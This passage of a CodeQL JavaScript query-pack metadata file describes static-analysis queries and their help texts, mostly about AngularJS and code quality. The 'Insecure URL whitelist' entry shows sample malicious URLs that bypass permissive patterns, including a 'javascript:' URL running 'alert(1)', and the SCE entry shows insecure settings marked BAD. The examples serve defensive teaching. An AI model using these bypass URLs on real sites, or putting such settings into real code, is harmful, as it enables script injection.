---
queries:
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AlertSuppression.ql
    relativeBqrsPath: codeql/javascript-queries/AlertSuppression.bqrs
    metadata:
      name: Alert suppression
      description: Generates information about alert suppressions.
      kind: alert-suppression
      id: js/alert-suppression
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/DeadAngularJSEventListener.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/DeadAngularJSEventListener.bqrs
    metadata:
      name: Dead AngularJS event listener
      description:
        An AngularJS event listener that listens for a non-existent event
        has no effect.
      kind: problem
      problem.severity: warning
      precision: low
      id: js/angular/dead-event-listener
      tags: |-
        correctness
               frameworks/angularjs
    queryHelp: |
      # Dead AngularJS event listener
      AngularJS applications use the method `$scope.$on` to register event listeners for the events sent out by `$scope.$emit` and `$scope.$broadcast`.

      The first argument to `$scope.$on` is the name of the event to listen for. Listening for an event that never gets sent means that the event listener never gets invoked. This is likely an error caused by either: a misspelled event name, or a missing call to `$scope.emit` or `$scope.broadcast` somewhere else.


      ## Recommendation
      Only register event listeners for events that exist.


      ## Example
      The following example shows an AngularJS controller that registers a cleanup function to listen for the `destroy` event.


      ```javascript
      angular.module('myModule', [])
          .controller('MyController', function($scope) {
              function cleanup() {
                  // close database connection
                  // ...
              }
              $scope.$on('destroy', cleanup); // BAD
          });

      ```
      This is problematic, since the `destroy` event is not emitted by AngularJS, meaning that the cleanup function never gets called.

      Instead, the programmer should fix a typo and make the `cleanup` function listen for the builtin `$destroy` event:


      ```javascript
      angular.module('myModule', [])
          .controller('MyController', function($scope) {
              function cleanup() {
                  // close database connection
                  // ...
              }
              $scope.$on('$destroy', cleanup); // GOOD
          });

      ```
      Alternatively, the programmer should use `$scope.$emit` or `$scope.$broadcast` to send the `destroy` event in another controller:


      ```javascript
      angular.module('myModule', [])
          .controller('MyController', function($scope) {
              function cleanup() {
                  // close database connection
                  // ...
              }
              $scope.$on('destroy', cleanup); // GOOD
          })
          .controller('MyOtherController', function($scope) {
              $scope.$emit('destroy');
          });

      ```

      ## References
      * AngularJS Developer Guide: [Events: $broadcast](https://docs.angularjs.org/api/ng/type/$rootScope.Scope#$broadcast).
      * AngularJS Developer Guide: [Events: $emit](https://docs.angularjs.org/api/ng/type/$rootScope.Scope#$emit).
      * AngularJS Developer Guide: [Events: $on](https://docs.angularjs.org/api/ng/type/$rootScope.Scope#$on).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/DependencyMismatch.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/DependencyMismatch.bqrs
    metadata:
      name: Dependency mismatch
      description: |-
        If the injected dependencies of a function go out of sync
                      with its parameters, the function will become difficult to
                      understand and maintain.
      kind: problem
      problem.severity: warning
      precision: very-high
      id: js/angular/dependency-injection-mismatch
      tags: |-
        quality
               reliability
               correctness
               frameworks/angularjs
    queryHelp: |
      # Dependency mismatch
      AngularJS has built-in support for dependency injection: directives can simply list the services they depend on and AngularJS will provide appropriate instances and pass them as arguments at runtime.

      Developers have to ensure that the list of dependencies matches the parameter list of the directive's factory function: if a dependency is missing, no service instance will be injected, and the corresponding parameter will default to `undefined`. If a dependency and its corresponding parameter have different names, this makes the code hard to follow, and may even indicate a bug.


      ## Recommendation
      Ensure that declared dependencies and parameters match up.


      ## Example
      The following example directive declares a single dependency on the `$compile` service, but its factory function has two parameters `$compile` and `$http`. Presumably the second parameter was introduced without adding a corresponding dependency, so the service will not be injected correctly.


      ```javascript
      angular.module('myapp')
             .directive('mydirective', [ '$compile', function($compile, $http) {
                 // ...
             }]);
      ```
      To solve this problem, the `$http` service has to be listed as a dependency as well:


      ```javascript
      angular.module('myapp')
             .directive('mydirective', [ '$compile', '$http', function($compile, $http) {
                 // ...
             }]);
      ```

      ## References
      * AngularJS Developer Guide: [Dependency Injection](https://docs.angularjs.org/guide/di).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/DisablingSce.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/DisablingSce.bqrs
    metadata:
      name: Disabling SCE
      description: Disabling strict contextual escaping (SCE) can cause security vulnerabilities.
      kind: problem
      problem.severity: warning
      security-severity: 7.8
      precision: very-high
      id: js/angular/disabling-sce
      tags: |-
        security
               maintainability
               frameworks/angularjs
               external/cwe/cwe-116
    queryHelp:
      "# Disabling SCE\nAngularJS is secure by default through automated sanitization\
      \ and filtering of untrusted values that could cause vulnerabilities such as XSS.\
      \ Strict Contextual Escaping (SCE) is an execution mode in AngularJS that provides\
      \ this security mechanism.\n\nDisabling SCE in an AngularJS application is strongly\
      \ discouraged. It is even more discouraged to disable SCE in a library, since\
      \ it is an application-wide setting.\n\n\n## Recommendation\nDo not disable SCE.\n\
      \n\n## Example\nThe following example shows an AngularJS application that disables\
      \ SCE in order to dynamically construct an HTML fragment, which is later inserted\
      \ into the DOM through `$scope.html`.\n\n\n```javascript\nangular.module('app',\
      \ [])\n    .config(function($sceProvider) {\n        $sceProvider.enabled(false);\
      \ // BAD\n    }).controller('controller', function($scope) {\n        // ...\n\
      \        $scope.html = '<ul><li>' + item.toString() + '</li></ul>';\n    });\n\
      \n```\nThis is problematic, since it disables SCE for the entire AngularJS application.\n\
      \nInstead, just mark the dynamically constructed HTML fragment as safe using `$sce.trustAsHtml`,\
      \ before assigning it to `$scope.html`:\n\n\n```javascript\nangular.module('app',\
      \ [])\n    .controller('controller', function($scope, $sce) {\n        // ...\n\
      \        // GOOD (but should use the templating system instead)\n        $scope.html\
      \ = $sce.trustAsHtml('<ul><li>' + item.toString() + '</li></ul>'); \n    });\n\
      \n```\nPlease note that this example is for illustrative purposes only; use the\
      \ AngularJS templating system to dynamically construct HTML when possible.\n\n\
      \n## References\n* AngularJS Developer Guide: [Strict Contextual Escaping](https://docs.angularjs.org/api/ng/service/$sce)\n\
      * AngularJS Developer Guide: [Can I disable SCE completely?](https://docs.angularjs.org/api/ng/service/$sce#can-i-disable-sce-completely-).\n\
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/DoubleCompilation.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/DoubleCompilation.bqrs
    metadata:
      name: Double compilation
      description: |-
        Recompiling an already compiled part of the DOM can lead to
                      unexpected behavior of directives, performance problems, and memory leaks.
      kind: problem
      problem.severity: warning
      security-severity: 8.8
      id: js/angular/double-compilation
      tags: |-
        reliability
               frameworks/angularjs
               security
               external/cwe/cwe-1176
      precision: very-high
    queryHelp: |
      # Double compilation
      The AngularJS compiler processes (parts of) the DOM, determining which directives match which DOM elements, and then applies the directives to the elements. Each DOM element should only be compiled once, otherwise unexpected behavior may result.


      ## Recommendation
      Only compile new DOM elements.


      ## Example
      The following example (adapted from the AngularJS developer guide) shows a directive that adds a tooltip to a DOM element, and then compiles the entire element to apply nested directives.


      ```javascript
      angular.module('myapp')
             .directive('addToolTip', function($compile) {
        return {
          link: function(scope, element, attrs) {
            var tooltip = angular.element('<span ng-show="showToolTip">A tooltip</span>');
            tooltip.on('mouseenter mouseleave', function() {
              scope.$apply('showToolTip = !showToolTip');
            });
            element.append(tooltip);
            $compile(element)(scope); // NOT OK
          }
        };
      });

      ```
      This is problematic, since it will recompile all of `element`, including parts that have already been compiled.

      Instead, only the new element should be compiled:


      ```javascript
      angular.module('myapp')
             .directive('addToolTip', function($compile) {
        return {
          link: function(scope, element, attrs) {
            var tooltip = angular.element('<span ng-show="showToolTip">A tooltip</span>');
            tooltip.on('mouseenter mouseleave', function() {
              scope.$apply('showToolTip = !showToolTip');
            });
            element.append(tooltip);
            $compile(tooltip)(scope); // OK
          }
        };
      });

      ```

      ## References
      * AngularJS Developer Guide: [Double Compilation, and how to avoid it](https://docs.angularjs.org/guide/compiler#double-compilation-and-how-to-avoid-it).
      * Common Weakness Enumeration: [CWE-1176](https://cwe.mitre.org/data/definitions/1176.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/DuplicateDependency.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/DuplicateDependency.bqrs
    metadata:
      name: Duplicate dependency
      description:
        Repeated dependency names are redundant for AngularJS dependency
        injection.
      kind: problem
      problem.severity: warning
      precision: very-high
      id: js/angular/duplicate-dependency
      tags: |-
        quality
               maintainability
               readability
               frameworks/angularjs
    queryHelp: |
      # Duplicate dependency
      Dependency injection in AngularJS is done by providing the names of the desired dependencies. Providing the same name multiple times is redundant since the AngularJS injector uses a cache for instantiated dependencies.


      ## Recommendation
      Only include the name of each dependency once.


      ## Example
      The following example shows an AngularJS controller with `$cookies` as a duplicate dependency.


      ```javascript
      angular.module('myModule', [])
          .controller('MyController', ['$scope',
                                       '$cookies',
                                       '$cookies', // REDUNDANT
                                       function($scope, , $cookies1, $cookies2) {
              // ...
          });

      ```
      This is problematic, since the programmer could be led to believe that the two parameters `$cookies1` and `$cookies2` are different instances, which they are not.

      Instead, the dependency should only be listed once:


      ```javascript
      angular.module('myModule', [])
          .controller('MyController', ['$scope',
                                       '$cookies',
                                       function($scope, $cookies) {
              // ...
          });

      ```

      ## References
      * AngularJS Developer Guide: [Dependency Injection](https://docs.angularjs.org/guide/di).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/IncompatibleService.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/IncompatibleService.bqrs
    metadata:
      name: Incompatible dependency injection
      description:
        Dependency-injecting a service of the wrong kind causes an error
        at runtime.
      kind: problem
      problem.severity: error
      precision: high
      id: js/angular/incompatible-service
      tags: |-
        quality
               reliability
               correctness
               frameworks/angularjs
    queryHelp: |
      # Incompatible dependency injection
      AngularJS has built-in support for dependency injection: components can simply list the names of the services they depend on, and AngularJS will provide appropriate instances and pass them as arguments at runtime.

      Each injected service has a kind, this kind influences which components the service is compatible with.


      ## Recommendation
      Ensure that declared dependencies have the right kind for the component they are injected into.


      ## Example
      The following example shows a `config`-method that lists a dependency on a service named `year`. Later, a service of kind `value` is defined with the name `year`. This is not allowed, since `config`-methods can only be injected with services of kind `provider` or `constant`.


      ```javascript
      angular.module('myModule', [])
          .config(['year', function(year) {
              // ...
          }]);

      angular.module('myModule')
          .value('year', 2000); // BAD: year is of kind 'value'

      ```
      To solve this problem, the `year` service has to be of kind `constant`.


      ```javascript
      angular.module('myModule', [])
          .config(['year', function(year) {
              // ...
          }]);

      angular.module('myModule')
          .constant('year', 2000); // GOOD: year is of kind 'constant'

      ```

      ## References
      * AngularJS Developer Guide: [Dependency Injection](https://docs.angularjs.org/guide/di).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/InsecureUrlWhitelist.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/InsecureUrlWhitelist.bqrs
    metadata:
      name: Insecure URL whitelist
      description: URL whitelists that are too permissive can cause security vulnerabilities.
      kind: problem
      problem.severity: warning
      security-severity: 7.5
      precision: very-high
      id: js/angular/insecure-url-whitelist
      tags: |-
        security
               frameworks/angularjs
               external/cwe/cwe-183
               external/cwe/cwe-625
    queryHelp: |
      # Insecure URL whitelist
      AngularJS uses filters to ensure that the URLs used for sourcing AngularJS templates and other script-running URLs are safe. One such filter is a whitelist of URL patterns to allow.

      A URL pattern that is too permissive can cause security vulnerabilities.


      ## Recommendation
      Make the whitelist URL patterns as restrictive as possible.


      ## Example
      The following example shows an AngularJS application with whitelist URL patterns that all are too permissive.


      ```javascript
      angular.module('myApp', [])
          .config(function($sceDelegateProvider) {
              $sceDelegateProvider.resourceUrlWhitelist([
                  "*://example.org/*", // BAD
                  "https://**.example.com/*", // BAD
                  "https://example.**", // BAD
                  "https://example.*" // BAD
              ]);
          });

      ```
      This is problematic, since the four patterns match the following malicious URLs, respectively:

      * `javascript://example.org/a%0A%0Dalert(1)` (`%0A%0D` is a linebreak)
      * `https://evil.com/?ignore=://example.com/a`
      * `https://example.evil.com`
      * `https://example.evilTld`

      ## References
      * OWASP/Google presentation: [Securing AngularJS Applications](https://www.owasp.org/images/6/6e/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf)
      * AngularJS Developer Guide: [Format of items in resourceUrlWhitelist/Blacklist](https://docs.angularjs.org/api/ng/service/$sce#resourceUrlPatternItem).
      * Common Weakness Enumeration: [CWE-183](https://cwe.mitre.org/data/definitions/183.html).
      * Common Weakness Enumeration: [CWE-625](https://cwe.mitre.org/data/definitions/625.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/MissingExplicitInjection.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/MissingExplicitInjection.bqrs
    metadata:
      name: Missing explicit dependency injection
      description: |-
        Functions without explicit dependency injections
                        will not work when their parameter names are minified.
      kind: problem
      problem.severity: warning
      precision: high
      id: js/angular/missing-explicit-injection
      tags: |-
        quality
               reliability
               correctness
               frameworks/angularjs
    queryHelp: |
      # Missing explicit dependency injection
      When AngularJS injects dependencies into a function that does not have an explicit dependency specification, it matches up dependencies with function parameters by name. This is dangerous, since some source code transformations such as minification may change the names of parameters. Such a renaming will break the AngularJS application.


      ## Recommendation
      Do not use implicit annotations for dependency injected functions when the code is minified later.


      ## Example
      The following example shows an AngularJS controller with implicit dependency annotations.


      ```javascript
      angular.module('myModule', [])
          .controller('MyController', function($scope) { // BAD: implicit dependency name
              // ...
      });

      ```
      This is problematic, since the minified version of this controller could look like the following:


      ```javascript
      angular.module('myModule', [])
          .controller('MyController', function(a) { // BAD: dependency 'a' does not exist
              // ...
      });

      ```
      This would mean that the function is dependency-injected with the dependency named "a", which does not exist, leading to a crash at runtime.

      Instead, in order to support minification, specify the dependencies with explicit annotations:


      ```javascript
      angular.module('myModule', [])
          .controller('MyController', ['$scope', function($scope) { // GOOD: explicit dependency name
              // ...
      }]);

      ```

      ## References
      * AngularJS Developer Guide: [Dependency Injection - Implicit Annotation](https://docs.angularjs.org/guide/di#implicit-annotation).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/RepeatedInjection.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/RepeatedInjection.bqrs
    metadata:
      name: Repeated dependency injection
      description:
        Specifying dependency injections of an AngularJS component multiple
        times overrides earlier specifications.
      kind: problem
      problem.severity: warning
      precision: high
      id: js/angular/repeated-dependency-injection
      tags: |-
        quality
               maintainability
               readability
               frameworks/angularjs
    queryHelp: |
      # Repeated dependency injection
      AngularJS components can have a `$inject` property that specifies the dependencies to inject. You can assign this property multiple times, but doing so is confusing since later assignments overwrite earlier ones, and only the dependencies specified in the last assignment are actually injected.


      ## Recommendation
      Only specify dependencies once for each component.


      ## Example
      The following example shows an AngularJS controller that has its dependencies specified twice.


      ```javascript
      function myController($scope, $filter) {
          // ...
      }
      myController.$inject = ["$scope", "$cookies"]; // BAD: always overridden
      // ...
      myController.$inject = ["$scope", "$filter"];
      angular.module('myModule', []).controller('MyController', myController);

      ```
      This is problematic, since the second specification always overrides the first one.

      Instead, the dependencies should only be specified once:


      ```javascript
      function myController($scope, $filter) {
          // ...
      }
      myController.$inject = ["$scope", "$filter"]; // GOOD: specified once
      angular.module('myModule', []).controller('MyController', myController);

      ```

      ## References
      * AngularJS Developer Guide: [Dependency Injection](https://docs.angularjs.org/guide/di).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/UnusedAngularDependency.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/UnusedAngularDependency.bqrs
    metadata:
      name: Unused AngularJS dependency
      description: 'Unused dependencies are confusing, and should be removed.'
      kind: problem
      problem.severity: recommendation
      precision: low
      id: js/angular/unused-dependency
      tags: |-
        maintainability
               frameworks/angularjs
    queryHelp: |
      # Unused AngularJS dependency
      When a function is dependency-injected in AngularJS, the dependencies can be accessed through the function's parameters. Unused dependencies are confusing, and they potentially bloat the application footprint.


      ## Recommendation
      Do not include dependencies that are not used by a dependency-injected function.


      ## Example
      The following example shows an AngularJS controller with more dependencies than parameters.


      ```javascript
      angular.module('myModule', [])
          .controller('MyController', ['$scope', 'depA', 'depB', function($scope, depA) {
              // ...
      }]);

      ```
      This is problematic, since the `depB` dependency is unused.


      ## References
      * AngularJS Developer Guide: [Dependency Injection](https://docs.angularjs.org/guide/di).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: AngularJS/UseNgSrc.ql
    relativeBqrsPath: codeql/javascript-queries/AngularJS/UseNgSrc.bqrs
    metadata:
      name: Use of AngularJS markup in URL-valued attribute
      description: |-
        Using AngularJS markup in an HTML attribute that references a URL
                      (such as 'href' or 'src') may cause the browser to send a request
                      with an invalid URL.
      kind: problem
      problem.severity: warning
      precision: very-high
      id: js/angular/expression-in-url-attribute
      tags: |-
        quality
               reliability
               correctness
               frameworks/angularjs
    queryHelp: |
      # Use of AngularJS markup in URL-valued attribute
      Using AngularJS markup (that is, AngularJS expressions enclosed in double curly braces) in HTML attributes that reference URLs is not recommended: the browser may attempt to fetch the URL before the AngularJS compiler evaluates the markup, resulting in a request for an invalid URL.

      While this is not a serious problem, it can degrade user experience, since the page may, for example, display broken image links while loading.


      ## Recommendation
      Use the corresponding AngularJS attributes: `ng-src` instead of `src`, `ng-href` instead of `href`, and `ng-srcset` instead of `srcset`.


      ## Example
      The following example snippet loads an image from a URL that contains the AngularJS expression `{{item._id}}`.


      ```html
      <img src="#/resources/pics/{{item._id}}">

      ```
      At page loading time before AngularJS has been fully initialized, the browser may attempt to load the image from the un-evaluated URL `#/resources/pics/{{item._id}}`, which will most likely fail and result in a broken image link. Later on when AngularJS has been loaded, the AngularJS compiler will evaluate the expression `{{item._id}}` and replace it with its value, which will cause the browser to reload the image.

      To avoid the broken link and the reload, use the AngularJS-specific attribute `ng-src`:


      ```html
      <img ng-src="#/resources/pics/{{item._id}}">

      ```

      ## References
      * AngularJS API Reference: [ngHref](https://docs.angularjs.org/api/ng/directive/ngHref).
      * AngularJS API Reference: [ngSrc](https://docs.angularjs.org/api/ng/directive/ngSrc).
      * AngularJS API Reference: [ngSrcset](https://docs.angularjs.org/api/ng/directive/ngSrcset).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Comments/CommentedOutCode.ql
    relativeBqrsPath: codeql/javascript-queries/Comments/CommentedOutCode.bqrs
    metadata:
      name: Commented-out code
      description: Comments that contain commented-out code should be avoided.
      kind: problem
      problem.severity: recommendation
      id: js/commented-out-code
      tags: |-
        maintainability
               statistical
               non-attributable
      precision: medium
    queryHelp:
      "# Commented-out code\nCommented-out code is distracting and confusing\
      \ for developers who read the surrounding code, and its significance is often\
      \ unclear. It will not get compiled or tested when the code around it changes,\
      \ so it's likely to break over time. For these reasons, commented-out code should\
      \ be avoided.\n\n\n## Recommendation\nRemove or reinstate the commented-out code.\
      \ If you want to include a snippet of example code in a comment, consider enclosing\
      \ it in quotes or marking it up as appropriate for the source language.\n\n\n\
      ## Example\nIn the following example, a `console.log` method call, perhaps originally\
      \ used for debugging, is left in the code, but commented out. It should be removed\
      \ altogether.\n\n\n```javascript\nfunction area(r) {\n\t// console.log(\"Got r:\
      \ \" + r);\n\treturn r.length * r.width;\n}\n```\n\n## References\n* Mark Needham:\
      \ [The danger of commenting out code](http://www.markhneedham.com/blog/2009/01/17/the-danger-of-commenting-out-code/).\n\
      * Los Techies: [Commented Code == Technical Debt](http://lostechies.com/rodpaddock/2010/12/29/commented-code-technical-debt).\n\
      * High Integrity C++ Coding Standard: [2.3.2 Do not comment out code](http://www.codingstandard.com/rule/2-3-2-do-not-comment-out-code/).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Comments/FCommentedOutCode.ql
    relativeBqrsPath: codeql/javascript-queries/Comments/FCommentedOutCode.bqrs
    metadata:
      name: Lines of commented-out code in files
      description: Measures the number of commented-out lines of code in each file.
      kind: treemap
      treemap.warnOn: highValues
      metricType: file
      metricAggregate: avg sum max
      id: js/lines-of-commented-out-code-in-files
      tags: maintainability
    queryHelp:
      "# Lines of commented-out code in files\nThis metric counts the number\
      \ of lines of commented-out code in each file. Large amounts of commented-out\
      \ code often indicate poorly maintained code.\n\n\n## Example\nIn the following\
      \ example, a `console.log` method call, perhaps originally used for debugging,\
      \ is left in the code, but commented out. It should be removed altogether.\n\n\
      \n```javascript\nfunction area(r) {\n\t// console.log(\"Got r: \" + r);\n\treturn\
      \ r.length * r.width;\n}\n```\n\n## References\n* Mark Needham: [The danger of\
      \ commenting out code](http://www.markhneedham.com/blog/2009/01/17/the-danger-of-commenting-out-code/).\n\
      * Los Techies: [Commented Code == Technical Debt](http://lostechies.com/rodpaddock/2010/12/29/commented-code-technical-debt).\n\
      * High Integrity C++ Coding Standard: [2.3.2 Do not comment out code](http://www.codingstandard.com/rule/2-3-2-do-not-comment-out-code/).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Comments/TodoComments.ql
    relativeBqrsPath: codeql/javascript-queries/Comments/TodoComments.bqrs
    metadata:
      name: TODO comment
      description: |-
        A comment that contains 'TODO' or similar keywords may indicate code that is incomplete or
                      broken, or it may highlight an ambiguity in the software's specification.
      kind: problem
      problem.severity: recommendation
      id: js/todo-comment
      tags: |-
        maintainability
               external/cwe/cwe-546
      precision: medium
    queryHelp:
      "# TODO comment\nA comment that includes the words `TODO`, `FIXME` or\
      \ similar words often indicates code that is incomplete or broken, or highlights\
      \ ambiguities in the software's specification.\n\n\n## Recommendation\nAddress\
      \ the problem indicated by the comment.\n\n\n## Example\nIn the following example,\
      \ the programmer has not yet implemented the correct behavior for the case where\
      \ parameter `a` is zero: the function will return `Infinity` or `NaN` (depending\
      \ on the values of `b` and `c`) in this case.\n\n\n```javascript\nfunction solveQuadratic(a,\
      \ b, c) {\n\t// TODO: handle case where a === 0\n\treturn (-b + Math.sqrt(b*b\
      \ - 4*a*c))/(2*a);\n}\n```\nAs a first step to fixing this problem, a check could\
      \ be introduced that compares `a` to zero and throws an exception if this is the\
      \ case. A better solution would be to use a different formula that does not rely\
      \ on `a` being non-zero. Regardless of the solution adopted, the `TODO` comment\
      \ should then be removed.\n\n\n## References\n* Approxion: [TODO or not TODO](http://www.approxion.com/?p=39).\n\
      * Wikipedia: [Comment tags](http://en.wikipedia.org/wiki/Comment_%28computer_programming%29#Tags).\n\
      * Common Weakness Enumeration: [CWE-546](https://cwe.mitre.org/data/definitions/546.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/ArgumentsRedefined.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/ArgumentsRedefined.bqrs
    metadata:
      name: Arguments redefined
      description: |-
        The special 'arguments' variable can be redefined, but this should be avoided
                      since it makes code hard to read and maintain and may prevent compiler
                      optimizations.
      kind: problem
      problem.severity: recommendation
      id: js/arguments-redefinition
      tags: |-
        quality
               reliability
               performance
      precision: very-high
    queryHelp:
      "# Arguments redefined\nJavaScript functions can access their arguments\
      \ by position (rather than by parameter name) through the special `arguments`\
      \ object. However, if a function declares a parameter or local variable named\
      \ `arguments`, or assigns a new value to `arguments`, then the `arguments` object\
      \ is no longer available. This is confusing and makes code hard to understand,\
      \ so it should be avoided.\n\nAlso note that many popular JavaScript engines (such\
      \ as V8, which is used by Google Chrome and Node.js) do not support optimization\
      \ of functions that assign to `arguments`, so such functions will run more slowly.\n\
      \n\n## Recommendation\nRename the variable to something else.\n\n\n## Example\n\
      In the following example, the `arguments` parameter of function `f` shadows the\
      \ special `arguments` variable. As a result, the `arguments` object cannot be\
      \ accessed inside `f`. To the casual reader, the test `x === arguments[0]` may\
      \ look redundant, since normally `arguments[0]` refers to the first argument (`x`\
      \ in this case), which would make the test trivially true. This is not the case\
      \ here, however, since `arguments[0]` refers to the first element of the array\
      \ passed in as the second argument.\n\n\n```javascript\nfunction f(x, arguments)\
      \ {\n\tif (x === arguments[0])\n\t\treturn 23;\n\treturn 42;\n}\n```\n\n## References\n\
      * Mozilla Developer Network: [arguments](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions_and_function_scope/arguments).\n\
      * Petka Antonov: [Optimization killers](https://github.com/petkaantonov/bluebird/wiki/Optimization-killers#3-managing-arguments).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/AssignmentToConst.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/AssignmentToConst.bqrs
    metadata:
      name: Assignment to constant
      description: |-
        Assigning to a variable that is declared 'const' has either no effect or leads to a
                      runtime error, depending on the platform.
      kind: problem
      problem.severity: error
      id: js/assignment-to-constant
      tags: |-
        quality
               reliability
               correctness
      precision: very-high
    queryHelp: |
      # Assignment to constant
      Most popular JavaScript platforms support `const` declarations, although this feature is not part of the ECMAScript 5 standard. Assigning a new value to a variable that is declared `const` does not result in an error on current platforms, and simply has no effect. Relying on this behavior is error-prone, particularly since ECMAScript 2015 prohibits such assignments.


      ## Recommendation
      If the variable genuinely needs to be reassigned, change its declaration from `const` to `var`, or merge the assignment into the variable declaration, if possible. Otherwise, remove the spurious assignment.


      ## Example
      In the following example, `loc` is initialized to `null`, and then set to either `"here"` or `"there"`, depending on the value of variable `dist`. Most current platforms, however, will ignore the assignments entirely, so `loc` will retain its original value `null`.


      ```javascript
      const loc = null;
      if (dist < 10)
          loc = "here";
      else
          loc = "there";
      ```
      Instead, the assignments to `loc` can be merged into its declaration like this:


      ```javascript
      const loc = dist < 10 ? "here" : "there";
      ```

      ## References
      * Mozilla Developer Network: [const](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/ClobberingVarInit.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/ClobberingVarInit.bqrs
    metadata:
      name: Conflicting variable initialization
      description: |-
        If a variable is declared and initialized twice inside the same variable declaration
                      statement, the second initialization immediately overwrites the first one.
      kind: problem
      problem.severity: error
      id: js/variable-initialization-conflict
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-563
      precision: very-high
    queryHelp: |
      # Conflicting variable initialization
      If a variable is declared and initialized twice inside the same variable declaration statement, the second initialization immediately overwrites the first one. This is confusing at best, and probably indicates an underlying bug.


      ## Recommendation
      Rename the second variable declaration to avoid the conflict. For every use of the variable, examine it to find out whether it is meant to refer to the first or to the second declaration. If it is meant to refer to the second declaration, rename the use as well.


      ## Example
      In the following example, the variable declaration statement declares and initializes the variable `key` twice, once to `iter[0]` and once to `iter[1]`. The second initialization overwrites the first, so `key` ends up being set to `iter[1]`.


      ```javascript
      for (var iter in Iterator(aExtraHeaders)) {
          var key = iter[0], key = iter[1];
          xhr.setRequestHeader(key, value);
      }

      ```
      From context, it is clear that the second declaration is a typo: it should instead declare and initialize the variable `value`, which is referred to in the next line:


      ```javascript
      for (var iter in Iterator(aExtraHeaders)) {
          var key = iter[0], value = iter[1];
          xhr.setRequestHeader(key, value);
      }

      ```

      ## References
      * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 12.2. ECMA, 2011.
      * Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/ConflictingFunctions.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/ConflictingFunctions.bqrs
    metadata:
      name: Conflicting function declarations
      description: |-
        If two functions with the same name are declared in the same scope, one of the declarations
                      overrides the other without warning. This makes the code hard to read and maintain, and
                      may even lead to platform-dependent behavior.
      kind: problem
      problem.severity: error
      id: js/function-declaration-conflict
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-563
      precision: high
    queryHelp:
      "# Conflicting function declarations\nIf two functions with the same\
      \ name are declared in the same scope, one of the declarations overrides the other\
      \ without warning. This makes the code hard to read and maintain. In some cases,\
      \ which declaration overrides which may be platform dependent.\n\n\n## Recommendation\n\
      If the two declarations are duplicates, remove one of them. Otherwise, rename\
      \ one of them to distinguish the two functions, or turn the function declarations\
      \ into assignments of function expressions to the same local variable.\n\n\n##\
      \ Example\nIn the following example, function `converter` is defined differently\
      \ in the two branches of the `if` statement. However, the function definition\
      \ appearing later in the program text will override the one appearing earlier,\
      \ independent of the flow of execution through the `if` statement, so in this\
      \ case it is always the second function that is returned. (Note that this may\
      \ not be true on older browsers.)\n\n\n```javascript\nfunction getConverter(dir)\
      \ {\n\tif (dir === 'c2f') {\n\t\tfunction converter(c) {\n\t\t\treturn c * 9/5\
      \ + 32;\n\t\t}\n\t} else {\n\t\tfunction converter(f) {\n\t\t\treturn (f - 32)\
      \ * 5/9;\n\t\t}\n\t}\n\treturn converter;\n}\n```\nTo address this problem, introduce\
      \ a local variable `converter` and convert the function declarations into assignments\
      \ of function expressions to this variable:\n\n\n```javascript\nfunction getConverter(dir)\
      \ {\n\tvar converter;\n\tif (dir === 'c2f') {\n\t\tconverter = function (c) {\n\
      \t\t\treturn c * 9/5 + 32;\n\t\t};\n\t} else {\n\t\tconverter = function (f) {\n\
      \t\t\treturn (f - 32) * 5/9;\n\t\t};\n\t}\n\treturn converter;\n}\n```\n\n## References\n\
      * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 10.5.\
      \ ECMA, 2011.\n* Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/DeadStoreOfGlobal.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/DeadStoreOfGlobal.bqrs
    metadata:
      name: Useless assignment to global variable
      description: An assignment to a global variable that is never used has no effect.
      kind: problem
      problem.severity: warning
      id: js/useless-assignment-to-global
      tags: |-
        maintainability
               correctness
               external/cwe/cwe-563
      precision: low
    queryHelp:
      "# Useless assignment to global variable\nIf a global variable is only\
      \ ever assigned to but its value is never read, this could indicate dead code,\
